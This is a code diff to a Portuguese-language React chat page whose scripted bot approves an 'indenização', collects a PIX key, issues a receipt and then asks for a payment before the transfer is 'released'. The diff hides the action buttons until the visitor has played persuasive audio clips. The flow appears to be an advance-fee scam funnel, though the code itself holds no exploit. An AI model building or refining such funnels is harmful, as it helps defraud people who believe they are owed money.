@@ -55,6 +55,8 @@ const Chat = () => {
   const [currentAudio, setCurrentAudio] = useState<HTMLAudioElement | null>(null);
   const [playingAudioId, setPlayingAudioId] = useState<number | null>(null);
   const [selectedPixType, setSelectedPixType] = useState<"cpf" | "email" | null>(null);
+  const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
+  const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
   const messagesEndRef = useRef<HTMLDivElement>(null);
   const videoRef = useRef<HTMLVideoElement>(null);
 
@@ -301,6 +303,12 @@ const Chat = () => {
     audio.onended = () => {
       setPlayingAudioId(null);
       setCurrentAudio(null);
+      // Mark audio as listened
+      setAudioListened(prev => new Set(prev).add(audioSrc));
+      // Clear waiting state if this was the audio we were waiting for
+      if (waitingForAudio === audioSrc) {
+        setWaitingForAudio(null);
+      }
     };
   };
 
@@ -355,6 +363,8 @@ const Chat = () => {
 
     await delay(1500);
 
+    // Set waiting for audio - button will only show after audio is listened
+    setWaitingForAudio("/audio/audio-3.mp3");
     setStep("pix-selection");
   };
 
@@ -489,6 +499,8 @@ const Chat = () => {
 
     await addBotMessage(<span>Clique abaixo para <strong>gerar seu comprovante</strong>.</span>, true, 40);
 
+    // Set waiting for audio - button will only show after audio is listened
+    setWaitingForAudio("/audio/audio-2.mp3");
     setStep("comprovante-final");
   };
 
@@ -646,6 +658,8 @@ const Chat = () => {
 
     await addBotMessage(<span>Após o pagamento, a transferência será liberada <strong>imediatamente</strong>.</span>, true, 55);
 
+    // Set waiting for audio - button will only show after audio is listened
+    setWaitingForAudio("/audio/audio-1.mp3");
     setStep("final");
   };
 
@@ -809,10 +823,14 @@ const Chat = () => {
                 </Button>
               ))}
 
-              {step === "pix-selection" && (
+              {step === "pix-selection" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && (
                 <Button onClick={handleAprovarIndenizacao} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
                   ✓ APROVAR INDENIZAÇÃO
                 </Button>
+              )}
+
+              {step === "pix-selection" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && (
+                <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
               )}
 
               {step === "pix-type-selection" && (
@@ -832,10 +850,14 @@ const Chat = () => {
                 </Button>
               )}
 
-              {step === "comprovante-final" && (
+              {step === "comprovante-final" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && (
                 <Button onClick={handleGenerateComprovante} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
                   GERAR COMPROVANTE
                 </Button>
+              )}
+
+              {step === "comprovante-final" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && (
+                <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
               )}
 
               {step === "envio-selection" && (
@@ -857,10 +879,14 @@ const Chat = () => {
                 </Button>
               )}
 
-              {step === "final" && (
+              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && (
                 <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-6 animate-pulse">
                   💰 PAGAR E RECEBER
                 </Button>
+              )}
+
+              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && (
+                <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
               )}
             </div>
           )}
